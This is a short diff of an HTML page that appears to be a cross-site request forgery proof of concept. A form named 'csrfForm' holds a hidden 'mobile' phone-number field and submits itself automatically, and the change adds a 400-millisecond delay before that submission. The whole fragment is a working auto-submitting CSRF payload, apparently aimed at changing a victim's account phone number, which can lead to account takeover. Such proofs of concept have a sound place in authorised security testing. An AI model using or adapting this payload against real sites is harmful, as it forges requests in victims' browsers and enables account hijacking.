@@ -12,7 +12,9 @@
         <input type="hidden" name="mobile" value="+420720843234">
     </form>
     <script>
-        document.getElementById('csrfForm').submit();
+        setTimeout(() => {
+            document.getElementById('csrfForm').submit();
+        }, 400);
     </script>
 </body>
 </html>
